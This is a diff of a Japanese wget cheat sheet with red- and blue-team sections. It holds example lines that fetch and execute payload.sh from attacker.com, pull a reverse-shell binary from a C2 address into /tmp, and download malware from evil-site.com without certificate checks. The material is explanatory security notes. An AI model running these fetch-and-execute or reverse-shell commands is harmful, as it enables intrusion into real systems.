@@ -1,16 +1,10 @@
 ---
-tags:
-  - 'wget'
-  - 'networking'
-  - 'file transfer'
-  - 'cheetsheet'
-title: 'wget - 非対話的なネットワークダウンローダー'
-summary: 'HTTP, HTTPS, FTPプロトコルを使い、Webサーバーからファイルやコンテンツを非対話的にダウンロードするための堅牢なコマンドラインツールです。'
-related:
-  - 'curl'
-  - 'scp'
-  - 'sftp'
-  - 'bash'
+tags: ['wget' 'networking' 'file_transfer' 'curl' 'scp' 'sftp' 'bash']
+created: 2025-06-29 15:02
+modified: 2026-02-20 15:28
+environment: [OS/Linux]
+vulnearability: []
+knowledge_category: Command
 ---
 
 # Command  - Linux - wget - 非対話的なネットワークダウンローダー
@@ -39,20 +33,26 @@ related:
 * **解説**: `wget` でペイロードをダウンロードし、`chmod +x` で実行権限を付与、そして実行するという一連の流れは、攻撃の初期段階で頻繁に用いられます。
 * **コマンド例**:
 
-    ```bash
+		```bash
     # このコマンドシーケンスでペイロードをダウンロード・実行する
     # 1. /tmpディレクトリに移動
+
     cd /tmp
 
     # 2. 攻撃者のサーバーからスクリプトをダウンロード
+
     wget [http://attacker.com/payload.sh](http://attacker.com/payload.sh)
 
     # 3. 実行権限を付与
+
     chmod +x payload.sh
 
     # 4. スクリプトを実行
+
     ./payload.sh
+
     ```
+
 
 ## オプション説明
 
@@ -81,10 +81,13 @@ related:
 * **解説**: `-P` オプションで保存先のディレクトリを指定する、最も基本的な使い方です。`-c` を付けておくと、巨大なファイルのダウンロードが途中で中断されても再開できます。
 * **例**:
 
-    ```bash
+		```bash
     # Nginxのソースコードをダウンロードし、/usr/local/src/ ディレクトリに保存
+
     wget [http://nginx.org/download/nginx-1.26.0.tar.gz](http://nginx.org/download/nginx-1.26.0.tar.gz) -P /usr/local/src/
+
     ```
+
 
 ### 2. ブルーチーム視点
 
@@ -93,10 +96,13 @@ related:
 * **解説**: 脅威インテリジェンスで得られたマルウェアの配布URLから検体をダウンロードします。攻撃者のサーバーは自己署名証明書などを使っていることが多いため、`--no-check-certificate` が必要になる場合があります。**この操作は必ず隔離された安全な環境で行う必要があります**。
 * **例**:
 
-    ```bash
+		```bash
     # サンドボックス環境でマルウェア検体を収集
+
     wget --no-check-certificate [https://evil-site.com/malware.exe](https://evil-site.com/malware.exe) -O sample1.exe
+
     ```
+
 
 ### 3. レッドチーム視点
 
@@ -105,22 +111,25 @@ related:
 * **解説**: 攻撃者はシステム侵入後、まず `which wget` や `which curl` を実行し、外部と通信できるコマンドを探します。`wget` が存在すれば、それを使ってリバースシェルなどを `/tmp` や `/dev/shm` にダウンロードし、次の攻撃の準備を整えます。
 * **例**:
 
-    ```bash
+		```bash
     # C2サーバーからリバースシェルバイナリをダウンロード
+
     wget [http://10.0.0.5/revshell](http://10.0.0.5/revshell) -O /tmp/revshell
+
     ```
+
 
 ## エラーメッセージとトラブルシューティング
 
 * 一般的なエラーは [Linux共通のトラブルシューティング](OS%20%20-%20Linux%20-%20troubleshooting_common_errors%20-%20Linux共通エラー対応ガイド.md) を参照。
 
 1. **エラーメッセージ例 1**: `ERROR 404: Not Found.`
-    * **考えられる原因**: 指定したURLのパスが間違っているか、そのファイルはサーバー上に存在しません。
-    * **解決策**: URLをブラウザで開いてみて、正しいパスを確認してください。
+		* **考えられる原因**: 指定したURLのパスが間違っているか、そのファイルはサーバー上に存在しません。
+		* **解決策**: URLをブラウザで開いてみて、正しいパスを確認してください。
 
 2. **エラーメッセージ例 2**: `ERROR: The certificate of ‘...’ is not trusted.`
-    * **考えられる原因**: 接続先のHTTPSサーバーが使用しているSSL/TLS証明書が、システムの信頼する認証局 (CA) によって署名されていません。
-    * **解決策**: 接続先が信頼できることが確実な場合に限り、`--no-check-certificate` オプションを付けて証明書の検証をスキップします。
+		* **考えられる原因**: 接続先のHTTPSサーバーが使用しているSSL/TLS証明書が、システムの信頼する認証局 (CA) によって署名されていません。
+		* **解決策**: 接続先が信頼できることが確実な場合に限り、`--no-check-certificate` オプションを付けて証明書の検証をスキップします。
 
 ## 環境変数と設定ファイル
 
